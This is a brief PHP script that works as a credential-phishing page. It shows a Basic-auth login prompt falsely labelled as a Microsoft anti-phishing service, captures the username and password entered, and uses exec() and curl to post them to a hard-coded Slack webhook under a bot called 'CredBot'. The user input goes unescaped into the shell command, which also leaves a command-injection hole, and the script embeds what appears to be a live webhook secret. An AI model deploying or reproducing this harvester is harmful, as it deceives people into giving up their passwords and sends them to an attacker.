<?php

$realm = uniqid();

if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Microsoft Anti-Phishing Engine"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
} else {
//    echo "<p>Hello {$_SERVER['PHP_AUTH_USER']}.</p>";
//    echo "<p>You entered {$_SERVER['PHP_AUTH_PW']} as your password.</p>";

echo $_SERVER['PHP_AUTH_USER'];
echo $_SERVER['PHP_AUTH_PW'];

$slackurl = "https://hooks.slack.com/services/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";

$message = "Received Credentials from ".$_SERVER['PHP_AUTH_USER']." : ".$_SERVER['PHP_AUTH_PW'];

$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#curtis_private", "username": "CredBot", "text": "'.$message.'", "icon_emoji": ":page_facing_up:"}\' '.$slackurl.'';

//echo $cmd;
exec($cmd);

}

?>